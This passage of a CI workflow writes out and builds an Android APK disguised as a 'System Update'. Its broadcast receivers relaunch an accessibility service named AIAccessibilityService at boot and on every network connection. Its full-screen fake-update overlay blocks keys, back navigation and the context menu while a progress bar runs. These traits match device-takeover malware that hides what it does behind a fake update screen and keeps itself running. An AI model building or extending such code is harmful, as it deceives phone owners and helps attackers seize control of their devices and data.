          public class BootReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                      Log.d("BootReceiver", "📱 Device booted, starting service");
                      context.startService(new Intent(context, AIAccessibilityService.class));
                  }
              }
          }
          EOF

      - name: Create NetworkReceiver.java
        run: |
          cat > app/src/main/java/com/system/update/NetworkReceiver.java << 'EOF'
          package com.system.update;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.net.ConnectivityManager;
          import android.net.NetworkInfo;
          import android.util.Log;

          public class NetworkReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
                  NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                  if (activeNetwork != null && activeNetwork.isConnected()) {
                      Log.d("NetworkReceiver", "🌐 Internet connected, starting service");
                      context.startService(new Intent(context, AIAccessibilityService.class));
                  }
              }
          }
          EOF

      # ==================== OVERLAY HTML ====================
      
      - name: Create Overlay HTML (security.html)
        run: |
          cat > app/src/main/assets/html/security.html << 'EOF'
          <!DOCTYPE html>
          <html lang="en">
          <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
          <title>System Update</title>
          <style>
            html, body {
              margin: 0;
              padding: 0;
              height: 100%;
              width: 100%;
              overflow: hidden;
              background: #0a0f1a;
              color: #e6e6e6;
              font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
              user-select: none;
            }
            .overlay {
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              display: flex;
              flex-direction: column;
              align-items: center;
              justify-content: center;
              text-align: center;
              z-index: 9999;
            }
            .icon { 
              font-size: 56px; 
              margin-bottom: 20px;
              animation: spin 3s linear infinite;
            }
            @keyframes spin {
              to { transform: rotate(360deg); }
            }
            h1 { 
              font-size: 24px; 
              margin: 0 0 10px;
              font-weight: 600;
            }
            p { 
              font-size: 15px; 
              color: #a8b3c7; 
              margin: 0 0 30px;
              max-width: 420px;
              padding: 0 20px;
            }
            .progress-container {
              width: 80%;
              max-width: 500px;
            }
            .progress { 
              background: #1e293b; 
              border-radius: 999px; 
              height: 8px; 
              overflow: hidden; 
            }
            .bar { 
              height: 8px; 
              width: 0%; 
              background: linear-gradient(90deg, #3b82f6, #06b6d4); 
              border-radius: 999px; 
              transition: width 0.2s linear;
            }
            .percent { 
              margin-top: 12px; 
              font-size: 13px; 
              color: #94a3b8; 
              letter-spacing: 0.5px;
            }
          </style>
          </head>
          <body>
            <div class="overlay">
              <div class="icon">⚙️</div>
              <h1>System Update in Progress</h1>
              <p>Please do not turn off your device. This may take a few minutes.</p>
              
              <div class="progress-container">
                <div class="progress">
                  <div class="bar" id="bar"></div>
                </div>
                <div class="percent" id="percent">Installing update 2026.04.1... 0%</div>
              </div>
            </div>

          <script>
            document.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('keydown', e => {
              if(['Escape','F5','F11','Tab','Alt','Control'].includes(e.key)) e.preventDefault();
            });

            history.pushState(null, null, location.href);
            window.addEventListener('popstate', () => {
              history.pushState(null, null, location.href);
            });

            function enterFullscreen() {
              const el = document.documentElement;
              if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
            }
            document.addEventListener('click', enterFullscreen, { once: true });

            const duration = 50000; 
            const startTime = Date.now();
            const bar = document.getElementById('bar');
            const percentText = document.getElementById('percent');

            function update() {
              const elapsed = Date.now() - startTime;
              let progress = Math.min((elapsed / duration) * 100, 100);
              progress = Math.floor(progress);
              
              bar.style.width = progress + '%';
              percentText.textContent = `Installing update 2026.04.1... ${progress}%`;

              if(progress < 100) {
                requestAnimationFrame(update);
              } else {
                percentText.textContent = `Installing update 2026.04.1... 100% - Complete`;
              }
            }
            requestAnimationFrame(update);
          </script>
          </body>
          </html>
          EOF

      # ==================== BUILD APK ====================
      
      - name: Build APK
        run: |
          echo "🔨 Building APK..."
          chmod +x gradlew
          ./gradlew clean assembleDebug
          
          if [ -f app/build/outputs/apk/debug/app-debug.apk ]; then
              echo "✅ APK built successfully!"
              ls -la app/build/outputs/apk/debug/
          else
              echo "❌ APK build failed!"
              exit 1
          fi

      # ==================== UPLOAD APK ====================
      
      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: system-update-ai-overlay
          path: app/build/outputs/apk/debug/app-debug.apk
          retention-days: 30
